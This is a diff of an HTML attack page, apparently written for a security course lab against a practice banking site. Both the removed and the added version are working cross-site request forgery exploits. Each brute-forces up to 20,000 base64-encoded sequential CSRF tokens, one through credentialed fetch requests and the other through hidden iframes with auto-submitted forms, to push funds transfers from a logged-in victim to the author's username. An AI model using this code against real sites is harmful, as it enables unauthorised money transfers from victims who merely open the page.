@@ -1,35 +1,33 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Transferring Funds...</title>
-</head>
 <body>
-    <script>
-        const targetUrl = "https://phish-me.quoccacorp.com/api/transfer";
-        const myUsername = "z5609537";
-        const amount = "100";
-        const start = 1;
-        const range = 20000;
-        async function bruteForceCSRF() {
-            for (let i = start; i < start + range; i++) {
-                const token = btoa(i.toString());
-                const formData = new URLSearchParams();
-                formData.append('username', myUsername);
-                formData.append('amount', amount);
-                formData.append('csrf_token', token);
-                fetch(targetUrl, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    credentials: 'include',
-                    body: formData,
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded'
-                    }
-                });
-            }
-        }
-        bruteForceCSRF();
-    </script>
-    <h2>Processing...</h2>
+<script>
+const myUsername = "z5609537";
+const amount = "100";
+
+for (let i = 1; i <= 20000; i++) {
+    const token = btoa(i.toString());
+    const iframe = document.createElement('iframe');
+    iframe.name = 'f' + i;
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = 'https://phish-me.quoccacorp.com/api/transfer';
+    form.target = 'f' + i;
+
+    const u = document.createElement('input');
+    u.name = 'username'; u.value = myUsername;
+    const a = document.createElement('input');
+    a.name = 'amount'; a.value = amount;
+    const c = document.createElement('input');
+    c.name = 'csrf_token'; c.value = token;
+
+    form.append(u, a, c);
+    document.body.appendChild(form);
+    form.submit();
+}
+</script>
 </body>
 </html>
